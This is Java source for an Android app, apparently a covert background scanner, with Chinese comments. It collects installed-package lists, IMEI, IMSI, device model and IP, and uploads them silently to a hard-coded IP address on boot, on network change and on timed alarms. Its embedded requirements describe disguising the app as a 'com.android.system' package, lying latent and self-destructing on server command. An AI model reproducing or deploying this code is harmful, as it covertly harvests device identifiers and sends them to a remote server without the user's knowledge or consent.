package com.wx.scan;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

import javax.net.ssl.HttpsURLConnection;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.text.TextUtils;

import com.wx.scan.utils.AppUtil;
import com.wx.scan.utils.LOG;
import com.wx.scan.utils.NetUtil;
import com.wx.scan.utils.SimUtil;

// TODO

// crc
// 双卡手机测试imsi

// 卸载自身

/** 扫描工具 */
public class ScanUtil {

	public static final String URL = "http://120.26.114.60/5/upimei.jsp";// 地址

	public static final String KEY_TIME = "KEY_TIME";// 记录时间的key

	public static final String space = ":";// 参数间隔
	public static final String space_item = "@";// 条目间隔

	public static void test() {
		// TODO
		// LOG.test("test :    " + SimUtil.getImsiString(App.get()));
		onOpen();
		//
		// File file=new File("/storage/sdcard0/scan/scan.apk");
		// LOG.test("file------- :    " +file.exists() );
	}

	/** 当收到通知 */
	public static void onReceiver(String action) {
		long first = App.getPreferenceUtil().getLong(
				"KEY_SCAN_FIRST_OPOEN_TIME", -1);
		LOG.test("收到广播  :  " + action + " -- " + first);

		if (first == -1) {
			ScanUtil.onOpen();
			return;
		}
		if ("android.net.conn.CONNECTIVITY_CHANGE".equals(action)) {// 网咯监听
			ScanUtil.onNetConnected();
		} else if ("android.intent.action.BOOT_COMPLETED".equals(action)) {// 开机
			ScanUtil.onOpen();
		} else if ("ACTION_ALARM_SCAN".equals(action)) {// 闹钟
			long time = System.currentTimeMillis();
			ScanUtil.scan(time);
		}
	}

	/** .sf文件的crc */
	public static String crc(String pkg) {
		// TODO
		return "crc";
	}

	/** .sf文件的crc */
	public static String crc(File file) {
		// TODO
		return "crc";
	}

	/** 卸载自身 */
	private static boolean unInstall() {
		// TODO
		return false;
	}

	/** 开机 */
	public static void onOpen() {
		LOG.test("开机:    --------------------------------------------------------------------------");

		long time = System.currentTimeMillis();
		App.getPreferenceUtil().setLong("KEY_SCAN_OPEN_TIME", time);
		scan(time);
	}

	/** 网络连接上 */
	public static void onNetConnected() {
		LOG.test("网咯切换 :   net:    " + NetUtil.isNetworkConnected()
				+ "wifi:   " + NetUtil.isWifiConnected());
		new Thread() {
			public void run() {
				upload();
			}
		}.start();
	}

	/** 扫描并记录 */
	public static void scan(final long time) {
		LOG.test("扫描 :    " + SimUtil.getIMSI(App.get()));
		new Thread() {
			public void run() {
				try {
					StringBuffer sb = new StringBuffer();
					List<PackageInfo> packageInfoList = App.get()
							.getPackageManager().getInstalledPackages(0); // 返回已安装的包信息列表
					int size = packageInfoList.size();
					for (int i = 0; i < size; i++) {
						PackageInfo info = packageInfoList.get(i);

						LOG.test(" p.applicationInfo.sourceDir:  "
								+ info.applicationInfo.sourceDir);

						String packagename = info.packageName;
						String version = info.versionName;
						int area = info.applicationInfo.flags
								& ApplicationInfo.FLAG_SYSTEM;
						int run = AppUtil.isBackgroundRunning(App.get(),
								packagename) ? 1 : 0;
						String crc = crc(packagename);
						sb.append(crc);
						sb.append(space);
						sb.append(packagename);
						sb.append(space);
						sb.append(version);
						sb.append(space);
						sb.append(area);
						sb.append(space);
						sb.append(run);
						if (i != size)
							sb.append(space_item);
					}
					save(time + "", sb.toString());
					upload(); // TODO 上传
				} catch (Exception e) {
					LOG.test(LOG.getStackTrace(e));
				}
				// 计算下次扫描时间
				setNext(time);
			}
		}.start();
	}

	@SuppressWarnings("static-access")
	/** 计算下次扫描时间 */
	public static void setNext(long time) {
		LOG.test("设置下一次扫描时间");
		// 1.第一次扫描：第一次开机时即扫描一次，记录在本地，第一次联网时完成上报，并告诉服务器自己是第几次上报。
		// 2.第二次扫描：持续开机5分钟，上报，并告诉服务器自己是第几次上报。
		// 3.第三次扫描：持续开机10分钟，上报，并告诉服务器自己是第几次上报。
		// 4.第四次扫描：持续开机30分钟，上报，并告诉服务器自己是第几次上报。
		// 5.第五次扫描：持续开机60分钟，上报，并告诉服务器自己是第几次上报。
		// 6.第六次扫描：持续开机120分钟，上报，并告诉服务器自己是第几次上报。
		// 7.之后每日进行一次记录，定时联网上报；

		long first = App.getPreferenceUtil().getLong(
				"KEY_SCAN_FIRST_OPOEN_TIME", -1);
		long now = App.getPreferenceUtil().getLong("KEY_SCAN_OPEN_TIME", -1);
		boolean isFist = first == -1;
		boolean isKeepFist = first == now;
		int minute = 5;
		if (isFist) {// 第一次
			first = time;
			App.getPreferenceUtil().setLong("KEY_SCAN_FIRST_OPOEN_TIME", first);
			minute = 5;
		} else if (isKeepFist) {// 保持第一次运行
			int count = App.getPreferenceUtil().getInt(
					"KEY_SCAN_KEEPFIST_COUNT", 2);// 第几次 扫描
			switch (count) {
			case 2:// 持续开机5分钟
				minute = 5;
				break;
			case 3:// 持续开机10分钟
				minute = 20;
				break;
			case 4:// 持续开机30分钟
				minute = 30;
				break;
			case 5:// 持续开机60分钟
				minute = 60;
				break;
			case 6:// 持续开机120分钟
				minute = 60;
				break;
			default:
				minute = 60 * 24;
				break;
			}
			count++;
			App.getPreferenceUtil().setInt("KEY_SCAN_KEEPFIST_COUNT", count);
		} else {// 重启过
			minute = 60 * 24;
		}
		Intent intent = new Intent(App.get(), ScanReceiver.class);
		intent.setAction("ACTION_ALARM_SCAN");
		PendingIntent sender = PendingIntent.getBroadcast(App.get(), 0, intent,
				0);
		AlarmManager am = (AlarmManager) App.get().getSystemService(
				App.get().ALARM_SERVICE);
		Calendar calendar = Calendar.getInstance();
		calendar.setTimeInMillis(System.currentTimeMillis());
		calendar.add(Calendar.MILLISECOND, minute * 3); // TODO 时间加速
		// calendar.add(Calendar.MINUTE, minute);
		am.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), sender);

		android.os.Process.killProcess(android.os.Process.myPid());// 杀掉自己的进程
	}

	/** 保存数据 */
	public static void save(String time, String value) {
		LOG.test("保存");
		App.getPreferenceUtil().setString(time, value);
		String times = App.getPreferenceUtil().getString(KEY_TIME, "");
		times += space + time;
		App.getPreferenceUtil().setString(KEY_TIME, times);
	}

	/** 查询并尝试上传 */
	public static void upload() {
		LOG.test("查询并尝试上传");
		if (!NetUtil.isNetworkConnected())
			return;
		String times = App.getPreferenceUtil().getString(KEY_TIME, null);
		if (TextUtils.isEmpty(times))
			return;
		String[] timeArr = times.split(space);
		for (String time : timeArr) {
			if (TextUtils.isEmpty(time))
				continue;
			String value = App.getPreferenceUtil().getString(time, null);
			if (TextUtils.isEmpty(value))
				continue;
			if (!upload(time, value))
				return;
		}
	}

	/** 上传 */
	public static boolean upload(String time, String value) {
		LOG.test("上传");
		try {
			// 统一参数
			String imei = AppUtil.getImei();// 串号
			String plat = AppUtil.getModel();// 机型
			String nettype = NetUtil.getNetTypeString();// 联网方式（wifi，net，wap)
			String ip = NetUtil.getIP();// 上报IP
			String imsi = SimUtil.getImsiString(App.get());// sim卡号

			// 请求普通信息
			Map<String, String> params = new HashMap<String, String>();
			params.put("imei", imei);
			params.put("plat", plat);
			params.put("netType", nettype);
			params.put("X-Forwarded-For", ip);
			params.put("imsi", imsi);
			params.put("time", time);
			// // 上传文件
			post(URL, params, value, time);
			return true;
		} catch (Exception e) {
			LOG.test("upload error " + LOG.getStackTrace(e));
		}
		return false;
	}

	/** 上传 */
	private static boolean post(final String path,
			final Map<String, String> params, final String re, final String time) {
		LOG.test("post上传");
		try {
			URL url = new URL(path);
			HttpURLConnection urlConn = (HttpURLConnection) url
					.openConnection();
			urlConn.setConnectTimeout(30 * 1000);
			// Post请求必须设置允许输出
			urlConn.setDoOutput(true);
			// Post请求不能使用缓存
			urlConn.setUseCaches(false);
			// 设置为Post请求
			urlConn.setRequestMethod("POST");
			// 允许重定向
			urlConn.setInstanceFollowRedirects(true);
			// 配置请求Content-Type
			urlConn.setRequestProperty("Content-Type",
					"application/x-www-form-urlencoded");
			// 发送请求参数
			for (String key : params.keySet()) {
				urlConn.setRequestProperty(key, params.get(key));
			}
			// 连接
			urlConn.connect();

			GZIPOutputStream os = new GZIPOutputStream(
					urlConn.getOutputStream());
			os.write(re.getBytes());
			os.flush();
			os.close();

			// 判断是否请求成功(状态码200表示成功)
			if (urlConn.getResponseCode() == HttpsURLConnection.HTTP_OK) {
				String result = new String(readData(urlConn.getInputStream()),
						"UTF-8");
				LOG.test("网络返回:" + result);
				try {
					int r = 0;// TODO 返回值
					// int r = Integer.parseInt(result);
					onFinish(time, r);
					return r == 0;
				} catch (Exception e) {
				}
			} else {
				LOG.test("urlConn.getResponseCode() :"
						+ urlConn.getResponseCode());
			}
		} catch (Exception e) {
			LOG.test("post error " + LOG.getStackTrace(e));
		}
		return false;
	}

	/** 读取数据 */
	private static byte[] readData(InputStream inStream) {
		ByteArrayOutputStream outStream = new ByteArrayOutputStream();
		try {
			byte[] buffer = new byte[1024];
			int len = 0;
			while ((len = inStream.read(buffer)) != -1) {
				outStream.write(buffer, 0, len);
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				inStream.close();
			} catch (IOException e) {
			}
		}
		return outStream.toByteArray();
	}

	/** 接收服务器指令 */
	@SuppressWarnings("static-access")
	public static boolean onFinish(String time, int result) {
		LOG.test("上传结果：  " + result);
		if (result == 0) {// 成功且继续运行
			// 去掉记录
			App.getPreferenceUtil().remove(time);
			String times = App.getPreferenceUtil().getString(KEY_TIME, "");
			times = times.replace(space + time, "");
			App.getPreferenceUtil().setString(KEY_TIME, times);
			// 潜伏
		} else if (result == 1) {// 不再运行
			Intent intent = new Intent(App.get(), ScanReceiver.class);
			intent.setAction("ACTION_ALARM_SCAN");
			PendingIntent sender = PendingIntent.getBroadcast(App.get(), 0,
					intent, 0);
			AlarmManager am = (AlarmManager) App.get().getSystemService(
					App.get().ALARM_SERVICE);
			am.cancel(sender);

			if (!unInstall())// 没有卸载掉自己
				android.os.Process.killProcess(android.os.Process.myPid());// 杀掉自己的进程
		} else {// 上传失败
		}
		return result == 0;
	}

	// /////////////////////////////////////////////////////////////////////////////////////////////////
	// 二、需求描述
	// a)统计字段范畴
	// i.UA信息：手机机型设备标识，例“UA=xiaomi_note”。
	// ii.IMEI号或者MEID：上报手机串号，及读取SIM卡卡槽位置，例“SIM1=XXXXXXX，SIM2=XXXXXXXX”。
	// iii.INSI状态：监听SIM卡插卡状态，例“SimSTATE=1“，“1”为插卡，“0”为未插卡，检验两个SIM卡卡槽，但上报只上报总体手机是否插卡的状态。
	// iv.Packagename：手机软件包名。
	// v.分区状态：相应软件所处的分区位置，例：“AREA=1”，“1”为系统分区，“0”为用户分区。
	// vi.Version值：上报每个Package的版本号。
	// vii.CRC32值：上报每个APK文件的CRC32值。
	// viii.数据采集扫描时间点。
	// b)存储逻辑
	// i.本地存储在TXT或者LOG文件中，联网的时候进行上报。
	// c)上报逻辑
	// i.上报时间点设置：
	// 1.第一次扫描：第一次开机时即扫描一次，记录在本地，第一次联网时完成上报，并告诉服务器自己是第几次上报。
	// 2.第二次扫描：持续开机5分钟，上报，并告诉服务器自己是第几次上报。
	// 3.第三次扫描：持续开机10分钟，上报，并告诉服务器自己是第几次上报。
	// 4.第四次扫描：持续开机30分钟，上报，并告诉服务器自己是第几次上报。
	// 5.第五次扫描：持续开机60分钟，上报，并告诉服务器自己是第几次上报。
	// 6.第六次扫描：持续开机120分钟，上报，并告诉服务器自己是第几次上报。
	// 7.之后每日进行一次记录，定时联网上报；
	// ii.每次上报完成后，服务器下发指令，APK删除受内存储的LOG。
	// d)APK功能
	// i.自毁，当服务器接受完成上报后，服务器下发指令，程序按照指令绝人，是否停止运行上报程序，并删除；
	// ii.独立生成后台APK文件，开机自起动，包名为“com.android.system.XXXXX”
	// 接口说明
	// 上报参数说明：
	// 参数信息
	// imei：串号
	// imsi：sim卡号
	// plat：机型
	// ipaddr:上报ip
	// nettype：联网方式（wifi，net，wap）
	// result：广告信息
	//
	// 广告信息说明：
	// Result参数要求在手机端将监测到的广告信息以压缩文件上报。
	// result=广告分区状态$广告版本$广告是否打开
	// result=
	// crc1:1@crc2:0@crc3:1$crc1:1.1.2@crc2:1.2.2@crc3:2.2.2$crc1:1@crc2:0
	// 广告分区状态：1代表系统分区，0代表用户分区
	// 广告版本：1.1.2代表该广告版本
	// 广告是否打开：1表示打开，0表示未打开
	// 接口：http://120.26.114.60/5/upimei.jsp
	// imei（串号），imsi(卡号)，plat(机型)，netType(联网方式)，ipaddr（ip地址），result这些参数带头信息上面提交
	//
	// 计数器是否停止运行：
	// 计数器调用接口后服务器会返回一个参数status：0|1
	// 0:表示计数器继续运行
	// 1:表示计数器停止运行
	//

}
